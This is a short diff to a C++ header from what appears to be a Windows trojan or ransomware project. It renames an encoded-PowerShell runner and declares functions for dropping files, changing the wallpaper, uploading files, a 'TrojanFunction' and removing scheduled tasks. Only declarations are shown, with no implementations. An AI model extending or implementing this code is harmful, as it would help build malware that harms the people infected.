@@ -22,7 +22,7 @@ typedef struct timeval2 {
     long tv_usec;
 } timeval2;
 
-std::vector<std::string> filesLink;
+extern std::vector<std::string> filesLink;
 
 
 // functions.cpp
@@ -33,7 +33,7 @@ std::vector<std::vector<std::string>> VectorSplitter(const std::vector<std::stri
 std::vector<std::vector<BYTE>> VectorSplitter(const std::vector<BYTE>& baseVector, int parts);
 bool Copyfile(const char* From, const char* To);
 bool FileExists(const std::string& name);
-void DropFile(const std::string& content, const std::string& path);
+void DropFile(const std::string& content, const std::string& path, bool dec = true);
 void ChangeWallpaper(const std::string& content);
 void ChangeIcon();
 
@@ -69,7 +69,7 @@ void UploadFiles(const std::vector<std::string>& files);
 std::vector<std::string> GetLinks();
 
 // security.cpp
-std::string PowershellEncodedCommand(const std::string& cmd);
+std::string RunPSEncCommand(const std::string& cmd);
 std::string GenerateRandom(const int len);
 DWORD TrojanFunction(LPVOID url);
 DWORD RemoveTasks(LPVOID params_useless);
